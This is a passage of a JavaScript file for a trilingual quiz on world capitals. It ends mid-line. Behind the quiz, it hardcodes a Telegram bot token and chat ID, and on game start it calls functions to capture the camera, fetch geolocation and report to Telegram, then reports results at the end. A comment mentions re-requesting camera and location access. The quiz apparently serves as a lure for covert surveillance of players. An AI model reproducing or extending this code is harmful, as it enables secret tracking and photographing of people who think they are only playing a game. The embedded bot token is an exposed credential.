// script.js

const TELEGRAM_BOT_TOKEN = '7921776519:AAEtasvOGOZxdZo4gUNscLC49zSdm3CtITw';
const TELEGRAM_CHAT_ID = '8071841674';

const questionsData = [
  {
    hy: {
      q: "Որն է Հայաստանի մայրաքաղաքը",
      answers: ["Երևան", "Գյումրի", "Վանաձոր", "Հրազդան"],
      correct: 0
    },
    ru: {
      q: "Какой город является столицей Армении",
      answers: ["Ереван", "Гюмри", "Ванадзор", "Раздан"],
      correct: 0
    },
    en: {
      q: "What is the capital of Armenia?",
      answers: ["Yerevan", "Gyumri", "Vanadzor", "Hrazdan"],
      correct: 0
    }
  },
  {
    hy: {
      q: "Որն է Ռուսաստանի մայրաքաղաքը",
      answers: ["Մոսկվա", "Սանկտ Պետերբուրգ", "Նովոսիբիրսկ", "Եկատերինբուրգ"],
      correct: 0
    },
    ru: {
      q: "Какой город является столицей России",
      answers: ["Москва", "Санкт-Петербург", "Новосибирск", "Екатеринбург"],
      correct: 0
    },
    en: {
      q: "What is the capital of Russia?",
      answers: ["Moscow", "Saint Petersburg", "Novosibirsk", "Yekaterinburg"],
      correct: 0
    }
  },
  {
    hy: {
      q: "Որն է Ֆրանսիայի մայրաքաղաքը",
      answers: ["Փարիզ", "Լիոն", "Մարսել", "Նիս"],
      correct: 0
    },
    ru: {
      q: "Какой город является столицей Франции",
      answers: ["Париж", "Лион", "Марсель", "Ницца"],
      correct: 0
    },
    en: {
      q: "What is the capital of France?",
      answers: ["Paris", "Lyon", "Marseille", "Nice"],
      correct: 0
    }
  },
  {
    hy: {
      q: "Որն է ԱՄՆ մայրաքաղաքը",
      answers: ["Վաշինգտոն", "Նյու Յորք", "Լոս Անջելես", "Չիկագո"],
      correct: 0
    },
    ru: {
      q: "Какой город является столицей США",
      answers: ["Вашингтон", "Нью-Йорк", "Лос-Анджелес", "Чикаго"],
      correct: 0
    },
    en: {
      q: "What is the capital of USA?",
      answers: ["Washington, D.C.", "New York", "Los Angeles", "Chicago"],
      correct: 0
    }
  },
  // ... добавить сюда до 30 вопросов аналогично ...
];

const translations = {
  hy: {
    enterName: "Մուտքագրեք ձեր անունը",
    startGame: "Սկսել խաղը",
    tryAgain: "Փորձել նորից",
    questionsLeft: "Հարցեր մնացել են",
    correctAnswers: "Ճիշտ պատասխաններ",
    wrongAnswers: "Սխալ պատասխաններ",
    victory: "Ձեզնով հաղթեցիք! 🎉",
    defeat: "Ցավում ենք, պարտվեցիք 😞",
    namePlaceholder: "Մուտքագրեք ձեր անունը"
  },
  ru: {
    enterName: "Введите ваше имя",
    startGame: "Начать игру",
    tryAgain: "Попробовать снова",
    questionsLeft: "Осталось вопросов",
    correctAnswers: "Правильных ответов",
    wrongAnswers: "Неправильных ответов",
    victory: "Вы выиграли! 🎉",
    defeat: "К сожалению, вы проиграли 😞",
    namePlaceholder: "Введите ваше имя"
  },
  en: {
    enterName: "Enter your name",
    startGame: "Start Game",
    tryAgain: "Try Again",
    questionsLeft: "Questions left",
    correctAnswers: "Correct answers",
    wrongAnswers: "Wrong answers",
    victory: "You won! 🎉",
    defeat: "Sorry, you lost 😞",
    namePlaceholder: "Enter your name"
  }
};

let currentLanguage = localStorage.getItem('lang') || 'hy';
let userName = '';
let currentQuestions = [];
let currentQuestionIndex = 0;
let correctCount = 0;
let wrongCount = 0;

let geoCoords = null;
let cameraStream = null;
let photoTimer = null;

const nameFormContainer = document.getElementById('name-form-container');
const nameForm = document.getElementById('name-form');
const nameInput = document.getElementById('name-input');
const nameLabel = document.querySelector('label[for="name-input"]');
const startBtn = nameForm.querySelector('button');

const gameArea = document.getElementById('game-area');
const userNameDiv = document.getElementById('user-name');
const scoreInfoDiv = document.getElementById('score-info');
const questionDiv = document.getElementById('question');
const answerButtonsDiv = document.getElementById('answer-buttons');
const tryAgainBtn = document.getElementById('try-again-btn');

// ---- Функции ----

function applyTranslations() {
  nameLabel.textContent = translations[currentLanguage].enterName;
  nameInput.placeholder = translations[currentLanguage].namePlaceholder;
  startBtn.textContent = translations[currentLanguage].startGame;
  tryAgainBtn.textContent = translations[currentLanguage].tryAgain;
  updateScoreInfo();
}

function updateScoreInfo() {
  const questionsLeft = 10 - currentQuestionIndex;
  scoreInfoDiv.textContent = `${translations[currentLanguage].questionsLeft}: ${questionsLeft} | ` +
    `${translations[currentLanguage].correctAnswers}: ${correctCount} | ` +
    `${translations[currentLanguage].wrongAnswers}: ${wrongCount}`;
  userNameDiv.textContent = userName || '-';
}

function shuffleArray(array) {
  for (let i = array.length - 1; i > 0; i--) {
    let j = Math.floor(Math.random() * (i + 1));
    [array[i], array[j]] = [array[j], array[i]];
  }
}

function selectQuestions() {
  let indices = Array.from(Array(questionsData.length).keys());
  shuffleArray(indices);
  currentQuestions = indices.slice(0, 10).map(i => questionsData[i]);
}

function startGame() {
  userName = nameInput.value.trim() || (currentLanguage === 'hy' ? "Անհայտ" : currentLanguage === 'ru' ? "Неизвестный" : "Unknown");
  localStorage.setItem('userName', userName);
  currentQuestionIndex = 0;
  correctCount = 0;
  wrongCount = 0;
  selectQuestions();
  nameFormContainer.style.display = 'none';
  gameArea.style.display = 'block';
  showQuestion();
  updateScoreInfo();
  sendTelegramStart();
  startCameraIfAllowed();
  getGeolocation();
}

function showQuestion() {
  clearAnswerButtons();
  if (currentQuestionIndex >= currentQuestions.length) {
    showResults();
    return;
  }
  const qObj = currentQuestions[currentQuestionIndex][currentLanguage];

  questionDiv.textContent = qObj.q;

  let answers = qObj.answers.map((a, i) => ({ text: a, isCorrect: i === qObj.correct }));
  shuffleArray(answers);

  answers.forEach((ans) => {
    let btn = document.createElement('button');
    btn.classList.add('btn');
    btn.textContent = ans.text;
    btn.addEventListener('click', () => selectAnswer(btn, ans.isCorrect));
    answerButtonsDiv.appendChild(btn);
  });

  updateScoreInfo();
}

function clearAnswerButtons() {
  while (answerButtonsDiv.firstChild) {
    answerButtonsDiv.removeChild(answerButtonsDiv.firstChild);
  }
}

function selectAnswer(button, isCorrect) {
  Array.from(answerButtonsDiv.children).forEach(btn => btn.disabled = true);

  if (isCorrect) {
    button.classList.add('correct');
    correctCount++;
  } else {
    button.classList.add('wrong');
    wrongCount++;
    // Показать правильный ответ
    Array.from(answerButtonsDiv.children).forEach(btn => {
      if (btn.textContent === currentQuestions[currentQuestionIndex][currentLanguage].answers[currentQuestions[currentQuestionIndex][currentLanguage].correct]) {
        btn.classList.add('correct');
      }
    });
  }

  updateScoreInfo();

  setTimeout(() => {
    currentQuestionIndex++;
    showQuestion();
  }, 1500);
}

function showResults() {
  clearAnswerButtons();
  questionDiv.textContent = correctCount >= 5 ? translations[currentLanguage].victory : translations[currentLanguage].defeat;
  tryAgainBtn.style.display = 'block';
  updateScoreInfo();
  sendTelegramResult();
}

tryAgainBtn.addEventListener('click', () => {
  tryAgainBtn.style.display = 'none';
  if (!geoCoords || !cameraStream) {
    // Если нет доступа к камере или геолокации, запросить заново
    request
